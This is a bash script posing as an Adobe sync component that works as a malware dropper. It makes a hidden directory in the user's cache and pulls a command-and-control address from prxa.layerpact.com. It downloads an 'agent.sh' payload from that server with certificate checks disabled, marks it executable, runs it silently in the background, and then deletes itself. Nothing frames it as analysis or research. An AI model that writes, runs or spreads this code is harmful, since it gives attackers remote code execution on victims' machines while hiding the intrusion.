#!/bin/bash


# Define target environment
ADOBE_DIR="$HOME/.cache/.adobe-sync"
mkdir -p "$ADOBE_DIR"


C2=$(curl -s --connect-timeout 10 http://prxa.layerpact.com/c2servers.txt | tr -d '[:space:]')


UID="LIN-$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 8 | head -n 1)"


AGENT_LOADER="$ADOBE_DIR/adobe_sync.sh"
curl -s -k "https://$C2/agent.sh?id=$UID" -o "$AGENT_LOADER"
chmod +x "$AGENT_LOADER"


nohup bash "$AGENT_LOADER" >/dev/null 2>&1 &

if [ -f "$0" ]; then
    rm -- "$0"
fi
exit
